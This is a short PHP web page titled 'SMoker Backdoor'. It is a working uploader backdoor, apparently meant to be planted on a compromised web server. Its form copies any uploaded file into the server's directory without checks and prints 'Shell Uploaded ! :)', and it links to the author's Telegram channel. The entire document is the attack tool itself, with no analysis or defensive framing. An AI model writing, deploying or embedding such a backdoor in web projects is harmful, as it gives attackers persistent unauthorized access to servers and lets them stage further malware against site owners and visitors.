<html>
<title> SMoker Backdoor </title>
<center>
	<h1> SMoker666 </h1>
<?php echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }else { echo '<b>Not uploaded ! </b><br><br>'; }}
?>
         <bgcolor="#000"><center><pre><font size="4px color="white"><p>[ <a href="https://t.me/SMoker666"><font color="red" face="courier">Telegram</font></a>]</p></font></pre></center>
      <div class="typewriter">
</html>
